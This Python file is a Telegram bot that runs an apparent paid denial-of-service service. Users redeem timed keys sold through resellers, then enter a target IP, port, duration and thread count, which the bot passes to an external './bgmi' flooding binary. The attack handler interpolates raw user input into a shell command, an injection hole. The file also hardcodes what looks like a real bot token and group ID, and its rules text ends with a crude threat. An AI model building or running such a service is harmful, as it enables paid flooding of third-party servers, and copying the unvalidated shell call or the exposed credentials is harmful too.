import os
import time
import logging
import asyncio
import multiprocessing
from telegram import Update, ReplyKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, CallbackContext, ConversationHandler
from telegram.helpers import escape_markdown

# Suppress HTTP request logs
logging.getLogger("httpx").setLevel(logging.WARNING)
logging.getLogger("telegram").setLevel(logging.WARNING)

# Logging Configuration
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
)

# Bot Configuration
TELEGRAM_BOT_TOKEN = '7064980384:AAGfNFTaf81DF3P4NLhHm0TRBSEV1XfBATw'  # Replace with your bot token
OWNER_USERNAME = "Riyahacksyt"  # Replace with your Telegram username (without @)
ALLOWED_GROUP_ID = -1002295161013  # Replace with your allowed group ID
MAX_THREADS = 1500  # Default max threads
max_duration = 150  # Default max attack duration

# File to store key data
KEY_FILE = "keys.txt"

# Key System
keys = {}  # Stores active keys and their expiration time
redeemed_users = {}  # Tracks users who have redeemed keys and their expiration time
redeemed_keys_info = {}  # Tracks which user redeemed which key

# Reseller System
resellers = set()  # Stores reseller user IDs
reseller_balances = {}  # Stores reseller balances (user_id: balance)

# Key Prices
KEY_PRICES = {
    "1H": 5,  # Price for 1-hour key
    "2H": 10,  # Price for 1-hour key
    "3H": 15,  # Price for 1-hour key
    "4H": 20,  # Price for 1-hour key
    "5H": 25,  # Price for 1-hour key
    "6H": 30,  # Price for 1-hour key
    "7H": 35,  # Price for 1-hour key
    "8H": 40,  # Price for 1-hour key
    "9H": 45,  # Price for 1-hour key
    "10H": 50,  # Price for 1-hour key
    "1D": 60,  # Price for 1-day key
    "3D": 160,  # Price for 1-day key
    "5D": 250,  # Price for 2-day key
    "7D": 320,  # Price for 2-day key
    "15D": 700,  # Price for 2-day key
    "30D": 1250,  # Price for 2-day key
    "60D": 2000,  # Price for 2-day key,
}

# Global Cooldown
global_cooldown = 0  # Global cooldown in seconds
last_attack_time = 0  # Timestamp of the last attack

# Custom Keyboard for Regular Users
regular_user_keyboard = [
    ['Start', 'Attack', 'Redeem Key'],
    ['Rules']
]
regular_user_markup = ReplyKeyboardMarkup(regular_user_keyboard, resize_keyboard=True)

# Custom Keyboard for Resellers
reseller_keyboard = [
    ['Start', 'Attack', 'Redeem Key'],
    ['Rules', 'Balance', 'Generate Key']
]
reseller_markup = ReplyKeyboardMarkup(reseller_keyboard, resize_keyboard=True)

# Custom Keyboard for Owner
owner_keyboard = [
    ['Start', 'Attack', 'Redeem Key'],
    ['Rules', 'Set Duration', 'Set Threads'],
    ['Generate Key', 'Keys', 'Delete Key'],
    ['Add Reseller', 'Remove Reseller', 'Add Coin'],
    ['Set Cooldown']  # New button for setting global cooldown
]
owner_markup = ReplyKeyboardMarkup(owner_keyboard, resize_keyboard=True)

# Conversation States
GET_DURATION = 1
GET_KEY = 2
GET_ATTACK_ARGS = 3
GET_SET_DURATION = 4
GET_SET_THREADS = 5
GET_DELETE_KEY = 6
GET_RESELLER_ID = 7
GET_REMOVE_RESELLER_ID = 8
GET_ADD_COIN_USER_ID = 9
GET_ADD_COIN_AMOUNT = 10
GET_SET_COOLDOWN = 11  # New state for setting cooldown

# Load key data from file
def load_keys():
    if not os.path.exists(KEY_FILE):
        return

    with open(KEY_FILE, "r") as file:
        for line in file:
            key_type, key_data = line.strip().split(":", 1)
            if key_type == "ACTIVE_KEY":
                # Handle old format (key, expiration_time) and new format (key, expiration_time, generated_by)
                parts = key_data.split(",")
                if len(parts) == 2:
                    key, expiration_time = parts
                    keys[key] = {
                        'expiration_time': float(expiration_time),
                        'generated_by': None  # Default to None for old keys
                    }
                elif len(parts) == 3:
                    key, expiration_time, generated_by = parts
                    keys[key] = {
                        'expiration_time': float(expiration_time),
                        'generated_by': int(generated_by)
                    }
            elif key_type == "REDEEMED_KEY":
                # Handle redeemed keys
                key, generated_by, redeemed_by, expiration_time = key_data.split(",")
                redeemed_users[int(redeemed_by)] = float(expiration_time)
                redeemed_keys_info[key] = {
                    'generated_by': int(generated_by),
                    'redeemed_by': int(redeemed_by)
                }

# Save key data to file
def save_keys():
    with open(KEY_FILE, "w") as file:
        # Write active keys
        for key, key_info in keys.items():
            if key_info['expiration_time'] > time.time():  # Only write non-expired keys
                file.write(f"ACTIVE_KEY:{key},{key_info['expiration_time']},{key_info['generated_by']}\n")

        # Write redeemed keys
        for key, key_info in redeemed_keys_info.items():
            if key_info['redeemed_by'] in redeemed_users:  # Only write if the user ID is still valid
                file.write(f"REDEEMED_KEY:{key},{key_info['generated_by']},{key_info['redeemed_by']},{redeemed_users[key_info['redeemed_by']]}\n")

# Check if bot is used in the allowed group
def is_allowed_group(update: Update):
    chat = update.effective_chat
    return chat.type in ['group', 'supergroup'] and chat.id == ALLOWED_GROUP_ID

# Check if the user is the owner
def is_owner(update: Update):
    return update.effective_user.username == OWNER_USERNAME

# Check if the user is a reseller
def is_reseller(update: Update):
    return update.effective_user.id in resellers

# Start Command
async def start(update: Update, context: CallbackContext):
    chat = update.effective_chat

    # If the user starts the bot in a private chat, send the main channel link
    if chat.type == "private":
        main_channel_link = "https://t.me/+wnHGZwkgKBo0ZDdl"  # Replace with your main channel link
        await update.message.reply_text(
            f"🌟 *Welcome!* 🌟\n\n"
            f"🔗 *Join our main channel for free 180 sec server hack:* {main_channel_link}\n\n"
            "*Use the bot in the allowed group for attacks!*",
            parse_mode='Markdown'
        )
        return

    # If the user starts the bot in the allowed group
    if not is_allowed_group(update):
        return

    message = (
        "*🔥 Welcome to the battlefield! 🔥*\n\n"
        "*Use Attack to start an attack!*\n\n"
        "*💥 Let the war begin!*"
    )

    # Show different keyboards for owner, resellers, and regular users
    if is_owner(update):
        await update.message.reply_text(text=message, parse_mode='Markdown', reply_markup=owner_markup)
    elif is_reseller(update):
        await update.message.reply_text(text=message, parse_mode='Markdown', reply_markup=reseller_markup)
    else:
        await update.message.reply_text(text=message, parse_mode='Markdown', reply_markup=regular_user_markup)

# Generate Key Command - Start Conversation
async def generate_key_start(update: Update, context: CallbackContext):
    if not (is_owner(update) or is_reseller(update)):
        await update.message.reply_text("❌ *Only the owner or resellers can generate keys!*", parse_mode='Markdown')
        return ConversationHandler.END

    await update.message.reply_text("⚠️ *Enter the duration for the key (e.g., 1H for 1 hour or 1D for 1 day).*", parse_mode='Markdown')
    return GET_DURATION

# Generate Key Command - Handle Duration Input
async def generate_key_duration(update: Update, context: CallbackContext):
    duration_str = update.message.text

    if duration_str not in KEY_PRICES:
        await update.message.reply_text("❌ *Invalid format! Use 1H, 1D, or 2D.*", parse_mode='Markdown')
        return ConversationHandler.END  # Terminate the conversation

    # Check if the reseller has enough balance
    user_id = update.effective_user.id
    if is_reseller(update):
        price = KEY_PRICES[duration_str]
        if user_id not in reseller_balances or reseller_balances[user_id] < price:
            await update.message.reply_text(f"❌ *Insufficient balance! You need {price} coins to generate this key.*", parse_mode='Markdown')
            return ConversationHandler.END  # Terminate the conversation

    # Generate a unique key
    unique_key = os.urandom(4).hex().upper()  # 4 bytes = 8 characters
    key = f"{OWNER_USERNAME}-{duration_str}-{unique_key}"
    keys[key] = {
        'expiration_time': time.time() + (int(duration_str[:-1]) * 3600 if duration_str.endswith('H') else int(duration_str[:-1]) * 86400),
        'generated_by': user_id
    }

    # Deduct coins from reseller's balance
    if is_reseller(update):
        reseller_balances[user_id] -= KEY_PRICES[duration_str]

    # Save the key to the file
    save_keys()

    await update.message.reply_text(f"🔑 *Generated Key:* `{key}`\n\n*This key is valid for {duration_str}.*", parse_mode='Markdown')
    return ConversationHandler.END

# Redeem Key Command - Start Conversation
async def redeem_key_start(update: Update, context: CallbackContext):
    await update.message.reply_text("⚠️ *Enter the key to redeem.*", parse_mode='Markdown')
    return GET_KEY

# Redeem Key Command - Handle Key Input
async def redeem_key_input(update: Update, context: CallbackContext):
    key = update.message.text

    if key in keys and keys[key]['expiration_time'] > time.time():  # Check if key is valid and not expired
        user_id = update.effective_user.id
        redeemed_users[user_id] = keys[key]['expiration_time']  # Store user's key expiration time
        redeemed_keys_info[key] = {
            'redeemed_by': user_id,
            'generated_by': keys[key]['generated_by']
        }
        del keys[key]  # Remove the key from the available keys

        # Save the updated key data to the file
        save_keys()

        await update.message.reply_text(f"✅ *Key redeemed successfully! You can now use the attack command for {key.split('-')[1]}.*", parse_mode='Markdown')
    else:
        await update.message.reply_text("❌ *Invalid or expired key!*", parse_mode='Markdown')
    return ConversationHandler.END  # Terminate the conversation

# Attack Command - Start Conversation
async def attack_start(update: Update, context: CallbackContext):
    global last_attack_time, global_cooldown

    # Check if the cooldown period is active
    current_time = time.time()
    if current_time - last_attack_time < global_cooldown:
        remaining_cooldown = int(global_cooldown - (current_time - last_attack_time))
        await update.message.reply_text(f"❌ *Please wait! Cooldown is active. Remaining: {remaining_cooldown} seconds.*", parse_mode='Markdown')
        return ConversationHandler.END

    user_id = update.effective_user.id

    # Check if the user has a valid key
    if user_id in redeemed_users and redeemed_users[user_id] > time.time():
        await update.message.reply_text("⚠️ *Enter the attack arguments: <ip> <port> <duration> <threads>*", parse_mode='Markdown')
        return GET_ATTACK_ARGS
    else:
        await update.message.reply_text("❌ *You need a valid key to start an attack! Use /redeemkey to redeem a key.*", parse_mode='Markdown')
        return ConversationHandler.END  # Terminate the conversation

# Attack Command - Handle Attack Input
async def attack_input(update: Update, context: CallbackContext):
    global last_attack_time

    args = update.message.text.split()
    if len(args) != 4:
        await update.message.reply_text("❌ *Invalid input! Please enter <ip> <port> <duration> <threads>.*", parse_mode='Markdown')
        return ConversationHandler.END  # Terminate the conversation

    ip, port, duration, threads = args
    duration = int(duration)
    threads = int(threads)

    if duration > max_duration:
        await update.message.reply_text(f"❌ *Attack duration exceeds the max limit ({max_duration} sec)!*", parse_mode='Markdown')
        return ConversationHandler.END  # Terminate the conversation

    if threads > MAX_THREADS:
        await update.message.reply_text(f"❌ *Number of threads exceeds the max limit ({MAX_THREADS})!*", parse_mode='Markdown')
        return ConversationHandler.END  # Terminate the conversation

    # Update the last attack time
    last_attack_time = time.time()

    await update.message.reply_text(
        f"⚔️ *Attack Started!*\n"
        f"🎯 *Target*: {ip}:{port}\n"
        f"🕒 *Duration*: {duration} sec\n"
        f"🧵 *Threads*: {threads}\n"
        f"🔥 *Let the battlefield ignite! 💥*",
        parse_mode='Markdown'
    )

    # Execute the external binary asynchronously
    process = await asyncio.create_subprocess_shell(
        f"./bgmi {ip} {port} {duration} {threads}",
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.PIPE
    )

    # Wait for the process to complete
    stdout, stderr = await process.communicate()

    # Check if the process was successful
    if process.returncode == 0:
        await update.message.reply_text(
            f"✅ *Attack Finished!*\n"
            f"🎯 *Target*: {ip}:{port}\n"
            f"🕒 *Duration*: {duration} sec\n"
            f"🧵 *Threads*: {threads}\n"
            f"🔥 *The battlefield is now silent.*",
            parse_mode='Markdown'
        )
    else:
        await update.message.reply_text(
            f"❌ *Attack Failed!*\n"
            f"🎯 *Target*: {ip}:{port}\n"
            f"🕒 *Duration*: {duration} sec\n"
            f"🧵 *Threads*: {threads}\n"
            f"💥 *Error*: {stderr.decode().strip()}",
            parse_mode='Markdown'
        )

    return ConversationHandler.END

# Set Cooldown Command - Start Conversation
async def set_cooldown_start(update: Update, context: CallbackContext):
    if not is_owner(update):
        await update.message.reply_text("❌ *Only the owner can set cooldown!*", parse_mode='Markdown')
        return ConversationHandler.END

    await update.message.reply_text("⚠️ *Enter the global cooldown duration in seconds.*", parse_mode='Markdown')
    return GET_SET_COOLDOWN

# Set Cooldown Command - Handle Cooldown Input
async def set_cooldown_input(update: Update, context: CallbackContext):
    global global_cooldown

    try:
        global_cooldown = int(update.message.text)
        await update.message.reply_text(f"✅ *Global cooldown set to {global_cooldown} seconds!*", parse_mode='Markdown')
    except ValueError:
        await update.message.reply_text("❌ *Invalid input! Please enter a number.*", parse_mode='Markdown')
        return ConversationHandler.END  # Terminate the conversation
    return ConversationHandler.END

# Show Active Keys
async def show_keys(update: Update, context: CallbackContext):
    if not (is_owner(update) or is_reseller(update)):
        await update.message.reply_text("❌ *Only the owner or resellers can view keys!*", parse_mode='Markdown')
        return

    active_keys = []
    for key, key_info in keys.items():
        if key_info['expiration_time'] > time.time():
            # Escape special characters in the key
            escaped_key = escape_markdown(key, version=2)
            generated_by_username = escape_markdown((await context.bot.get_chat(key_info['generated_by'])).username, version=2) if key_info['generated_by'] else "Unknown"
            active_keys.append(f"🔑 `{escaped_key}` (Generated by @{generated_by_username}, Expires in {int((key_info['expiration_time'] - time.time()) // 3600)} hours)")

    redeemed_keys = []
    for key, key_info in redeemed_keys_info.items():
        # Escape special characters in the key and username
        escaped_key = escape_markdown(key, version=2)
        generated_by_username = escape_markdown((await context.bot.get_chat(key_info['generated_by'])).username, version=2)
        redeemed_by_username = escape_markdown((await context.bot.get_chat(key_info['redeemed_by'])).username, version=2)
        redeemed_keys.append(f"🔑 `{escaped_key}` (Generated by @{generated_by_username}, Redeemed by @{redeemed_by_username})")

    if not active_keys and not redeemed_keys:
        await update.message.reply_text("❌ *No active or redeemed keys found!*", parse_mode='Markdown')
    else:
        message = "*🗝️ Active Keys:*\n" + "\n".join(active_keys) + "\n\n*🗝️ Redeemed Keys:*\n" + "\n".join(redeemed_keys)
        await update.message.reply_text(message, parse_mode='Markdown')

# Set Duration Command - Start Conversation
async def set_duration_start(update: Update, context: CallbackContext):
    if not is_owner(update):
        await update.message.reply_text("❌ *Only the owner can set max attack duration!*", parse_mode='Markdown')
        return ConversationHandler.END

    await update.message.reply_text("⚠️ *Enter the maximum attack duration in seconds.*", parse_mode='Markdown')
    return GET_SET_DURATION

# Set Duration Command - Handle Duration Input
async def set_duration_input(update: Update, context: CallbackContext):
    global max_duration
    try:
        max_duration = int(update.message.text)
        await update.message.reply_text(f"✅ *Maximum attack duration set to {max_duration} seconds!*", parse_mode='Markdown')
    except ValueError:
        await update.message.reply_text("❌ *Invalid input! Please enter a number.*", parse_mode='Markdown')
        return ConversationHandler.END  # Terminate the conversation
    return ConversationHandler.END

# Set Threads Command - Start Conversation
async def set_threads_start(update: Update, context: CallbackContext):
    if not is_owner(update):
        await update.message.reply_text("❌ *Only the owner can set max threads!*", parse_mode='Markdown')
        return ConversationHandler.END

    await update.message.reply_text("⚠️ *Enter the maximum number of threads.*", parse_mode='Markdown')
    return GET_SET_THREADS

# Set Threads Command - Handle Threads Input
async def set_threads_input(update: Update, context: CallbackContext):
    global MAX_THREADS
    try:
        MAX_THREADS = int(update.message.text)
        await update.message.reply_text(f"✅ *Maximum threads set to {MAX_THREADS}!*", parse_mode='Markdown')
    except ValueError:
        await update.message.reply_text("❌ *Invalid input! Please enter a number.*", parse_mode='Markdown')
        return ConversationHandler.END  # Terminate the conversation
    return ConversationHandler.END

# Delete Key Command - Start Conversation
async def delete_key_start(update: Update, context: CallbackContext):
    if not is_owner(update):
        await update.message.reply_text("❌ *Only the owner can delete keys!*", parse_mode='Markdown')
        return ConversationHandler.END

    await update.message.reply_text("⚠️ *Enter the key to delete.*", parse_mode='Markdown')
    return GET_DELETE_KEY

# Delete Key Command - Handle Key Input
async def delete_key_input(update: Update, context: CallbackContext):
    key = update.message.text

    if key in keys:
        del keys[key]
        await update.message.reply_text(f"✅ *Key `{key}` deleted successfully!*", parse_mode='Markdown')
    elif key in redeemed_keys_info:
        user_id = redeemed_keys_info[key]['redeemed_by']
        del redeemed_users[user_id]
        del redeemed_keys_info[key]
        await update.message.reply_text(f"✅ *Redeemed key `{key}` deleted successfully!*", parse_mode='Markdown')
    else:
        await update.message.reply_text("❌ *Key not found!*", parse_mode='Markdown')

    # Save the updated key data to the file
    save_keys()
    return ConversationHandler.END

# Add Reseller Command - Start Conversation
async def add_reseller_start(update: Update, context: CallbackContext):
    if not is_owner(update):
        await update.message.reply_text("❌ *Only the owner can add resellers!*", parse_mode='Markdown')
        return ConversationHandler.END

    await update.message.reply_text("⚠️ *Enter the user ID of the reseller.*", parse_mode='Markdown')
    return GET_RESELLER_ID

# Add Reseller Command - Handle User ID Input
async def add_reseller_input(update: Update, context: CallbackContext):
    user_id_str = update.message.text

    try:
        user_id = int(user_id_str)
        resellers.add(user_id)
        reseller_balances[user_id] = 0  # Initialize balance to 0
        await update.message.reply_text(f"✅ *Reseller with ID {user_id} added successfully!*", parse_mode='Markdown')
    except ValueError:
        await update.message.reply_text("❌ *Invalid user ID! Please enter a valid numeric ID.*", parse_mode='Markdown')
        return ConversationHandler.END  # Terminate the conversation

    return ConversationHandler.END

# Remove Reseller Command - Start Conversation
async def remove_reseller_start(update: Update, context: CallbackContext):
    if not is_owner(update):
        await update.message.reply_text("❌ *Only the owner can remove resellers!*", parse_mode='Markdown')
        return ConversationHandler.END

    await update.message.reply_text("⚠️ *Enter the user ID of the reseller to remove.*", parse_mode='Markdown')
    return GET_REMOVE_RESELLER_ID

# Remove Reseller Command - Handle User ID Input
async def remove_reseller_input(update: Update, context: CallbackContext):
    user_id_str = update.message.text

    try:
        user_id = int(user_id_str)
        if user_id in resellers:
            resellers.remove(user_id)
            if user_id in reseller_balances:
                del reseller_balances[user_id]
            await update.message.reply_text(f"✅ *Reseller with ID {user_id} removed successfully!*", parse_mode='Markdown')
        else:
            await update.message.reply_text("❌ *Reseller not found!*", parse_mode='Markdown')
    except ValueError:
        await update.message.reply_text("❌ *Invalid user ID! Please enter a valid numeric ID.*", parse_mode='Markdown')
        return ConversationHandler.END  # Terminate the conversation

    return ConversationHandler.END

# Add Coin Command - Start Conversation
async def add_coin_start(update: Update, context: CallbackContext):
    if not is_owner(update):
        await update.message.reply_text("❌ *Only the owner can add coins!*", parse_mode='Markdown')
        return ConversationHandler.END

    await update.message.reply_text("⚠️ *Enter the user ID of the reseller.*", parse_mode='Markdown')
    return GET_ADD_COIN_USER_ID

# Add Coin Command - Handle User ID Input
async def add_coin_user_id(update: Update, context: CallbackContext):
    user_id_str = update.message.text

    try:
        user_id = int(user_id_str)
        if user_id in resellers:
            context.user_data['add_coin_user_id'] = user_id
            await update.message.reply_text("⚠️ *Enter the amount of coins to add.*", parse_mode='Markdown')
            return GET_ADD_COIN_AMOUNT
        else:
            await update.message.reply_text("❌ *Reseller not found!*", parse_mode='Markdown')
            return ConversationHandler.END  # Terminate the conversation
    except ValueError:
        await update.message.reply_text("❌ *Invalid user ID! Please enter a valid numeric ID.*", parse_mode='Markdown')
        return ConversationHandler.END  # Terminate the conversation

    return ConversationHandler.END

# Add Coin Command - Handle Amount Input
async def add_coin_amount(update: Update, context: CallbackContext):
    amount_str = update.message.text

    try:
        amount = int(amount_str)
        user_id = context.user_data['add_coin_user_id']
        if user_id in reseller_balances:
            reseller_balances[user_id] += amount
            await update.message.reply_text(f"✅ *Added {amount} coins to reseller {user_id}. New balance: {reseller_balances[user_id]}*", parse_mode='Markdown')
        else:
            await update.message.reply_text("❌ *Reseller not found!*", parse_mode='Markdown')
    except ValueError:
        await update.message.reply_text("❌ *Invalid amount! Please enter a number.*", parse_mode='Markdown')
        return ConversationHandler.END  # Terminate the conversation

    return ConversationHandler.END

# Balance Command
async def balance(update: Update, context: CallbackContext):
    if not is_reseller(update):
        await update.message.reply_text("❌ *Only resellers can check their balance!*", parse_mode='Markdown')
        return

    user_id = update.effective_user.id
    balance = reseller_balances.get(user_id, 0)
    await update.message.reply_text(f"💰 *Your current balance is: {balance} coins*", parse_mode='Markdown')

# Handle Photo Feedback
async def handle_photo(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id in feedback_waiting:
        del feedback_waiting[user_id]
        await update.message.reply_text("✅ *Thanks for your feedback!*", parse_mode='Markdown')

# Cancel Current Conversation
async def cancel_conversation(update: Update, context: CallbackContext):
    await update.message.reply_text("❌ *Current process canceled.*", parse_mode='Markdown')
    return ConversationHandler.END

# Rules Command
async def rules(update: Update, context: CallbackContext):
    rules_text = (
        "📜 *Rules:*\n\n"
        "1. Do not spam the bot.\n\n"
        "2. Only use the bot in the allowed group.\n\n"
        "3. Do not share your keys with others.\n\n"
        "4. Follow the instructions carefully.\n\n"
        "5. Respect other users and the bot owner.\n\n"
        "6. Any violation of these rules will result key ban with no refund.\n\n\n"
        "BSDK RULES  FOLLOW KRNA WARNA GND MAR DUNGA.\n\n"
    )
    await update.message.reply_text(rules_text, parse_mode='Markdown')

# Handle Button Clicks
async def handle_button_click(update: Update, context: CallbackContext):
    query = update.message.text

    # Map button text to commands
    if query == 'Start':
        await start(update, context)
    elif query == 'Attack':
        await attack_start(update, context)
    elif query == 'Set Duration':
        await set_duration_start(update, context)
    elif query == 'Set Threads':
        await set_threads_start(update, context)
    elif query == 'Generate Key':
        await generate_key_start(update, context)
    elif query == 'Redeem Key':
        await redeem_key_start(update, context)
    elif query == 'Keys':
        await show_keys(update, context)
    elif query == 'Delete Key':
        await delete_key_start(update, context)
    elif query == 'Add Reseller':
        await add_reseller_start(update, context)
    elif query == 'Remove Reseller':
        await remove_reseller_start(update, context)
    elif query == 'Add Coin':
        await add_coin_start(update, context)
    elif query == 'Balance':
        await balance(update, context)
    elif query == 'Rules':
        await rules(update, context)
    elif query == 'Set Cooldown':
        await set_cooldown_start(update, context)

# Periodic Task to Check for Expired Keys
async def check_expired_keys(context: CallbackContext):
    current_time = time.time()
    expired_users = [user_id for user_id, expiration_time in redeemed_users.items() if expiration_time <= current_time]
    
    for user_id in expired_users:
        # Remove expired user from redeemed_users
        del redeemed_users[user_id]

        # Remove any keys associated with the expired user from redeemed_keys_info
        expired_keys = [key for key, uid in redeemed_keys_info.items() if uid == user_id]
        for key in expired_keys:
            del redeemed_keys_info[key]

    # Save the updated key data to the file
    save_keys()
    logging.info(f"Expired users and keys removed: {expired_users}")

# Main Bot Setup
def main():
    # Load key data from file
    load_keys()

    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()

    # Add a job queue to check for expired keys every minute
    application.job_queue.run_repeating(check_expired_keys, interval=60, first=0)

    # Conversation Handlers
    generate_key_handler = ConversationHandler(
        entry_points=[CommandHandler("generatekey", generate_key_start), MessageHandler(filters.Text("Generate Key"), generate_key_start)],
        states={
            GET_DURATION: [MessageHandler(filters.TEXT & ~filters.COMMAND, generate_key_duration)],
        },
        fallbacks=[CommandHandler("cancel", cancel_conversation)],
    )

    redeem_key_handler = ConversationHandler(
        entry_points=[CommandHandler("redeemkey", redeem_key_start), MessageHandler(filters.Text("Redeem Key"), redeem_key_start)],
        states={
            GET_KEY: [MessageHandler(filters.TEXT & ~filters.COMMAND, redeem_key_input)],
        },
        fallbacks=[CommandHandler("cancel", cancel_conversation)],
    )

    attack_handler = ConversationHandler(
        entry_points=[CommandHandler("attack", attack_start), MessageHandler(filters.Text("Attack"), attack_start)],
        states={
            GET_ATTACK_ARGS: [MessageHandler(filters.TEXT & ~filters.COMMAND, attack_input)],
        },
        fallbacks=[CommandHandler("cancel", cancel_conversation)],
    )

    set_duration_handler = ConversationHandler(
        entry_points=[CommandHandler("setduration", set_duration_start), MessageHandler(filters.Text("Set Duration"), set_duration_start)],
        states={
            GET_SET_DURATION: [MessageHandler(filters.TEXT & ~filters.COMMAND, set_duration_input)],
        },
        fallbacks=[CommandHandler("cancel", cancel_conversation)],
    )

    set_threads_handler = ConversationHandler(
        entry_points=[CommandHandler("set_threads", set_threads_start), MessageHandler(filters.Text("Set Threads"), set_threads_start)],
        states={
            GET_SET_THREADS: [MessageHandler(filters.TEXT & ~filters.COMMAND, set_threads_input)],
        },
        fallbacks=[CommandHandler("cancel", cancel_conversation)],
    )

    delete_key_handler = ConversationHandler(
        entry_points=[CommandHandler("deletekey", delete_key_start), MessageHandler(filters.Text("Delete Key"), delete_key_start)],
        states={
            GET_DELETE_KEY: [MessageHandler(filters.TEXT & ~filters.COMMAND, delete_key_input)],
        },
        fallbacks=[CommandHandler("cancel", cancel_conversation)],
    )

    add_reseller_handler = ConversationHandler(
        entry_points=[CommandHandler("addreseller", add_reseller_start), MessageHandler(filters.Text("Add Reseller"), add_reseller_start)],
        states={
            GET_RESELLER_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, add_reseller_input)],
        },
        fallbacks=[CommandHandler("cancel", cancel_conversation)],
    )

    remove_reseller_handler = ConversationHandler(
        entry_points=[CommandHandler("removereseller", remove_reseller_start), MessageHandler(filters.Text("Remove Reseller"), remove_reseller_start)],
        states={
            GET_REMOVE_RESELLER_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, remove_reseller_input)],
        },
        fallbacks=[CommandHandler("cancel", cancel_conversation)],
    )

    add_coin_handler = ConversationHandler(
        entry_points=[CommandHandler("addcoin", add_coin_start), MessageHandler(filters.Text("Add Coin"), add_coin_start)],
        states={
            GET_ADD_COIN_USER_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, add_coin_user_id)],
            GET_ADD_COIN_AMOUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, add_coin_amount)],
        },
        fallbacks=[CommandHandler("cancel", cancel_conversation)],
    )

    set_cooldown_handler = ConversationHandler(
        entry_points=[CommandHandler("setcooldown", set_cooldown_start), MessageHandler(filters.Text("Set Cooldown"), set_cooldown_start)],
        states={
            GET_SET_COOLDOWN: [MessageHandler(filters.TEXT & ~filters.COMMAND, set_cooldown_input)],
        },
        fallbacks=[CommandHandler("cancel", cancel_conversation)],
    )

    # Add all handlers
    application.add_handler(generate_key_handler)
    application.add_handler(redeem_key_handler)
    application.add_handler(attack_handler)
    application.add_handler(set_duration_handler)
    application.add_handler(set_threads_handler)
    application.add_handler(delete_key_handler)
    application.add_handler(add_reseller_handler)
    application.add_handler(remove_reseller_handler)
    application.add_handler(add_coin_handler)
    application.add_handler(set_cooldown_handler)
    application.add_handler(CommandHandler("start", start))
    application.add_handler(MessageHandler(filters.PHOTO, handle_photo))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_button_click))

    application.run_polling()

if __name__ == '__main__':
    main()
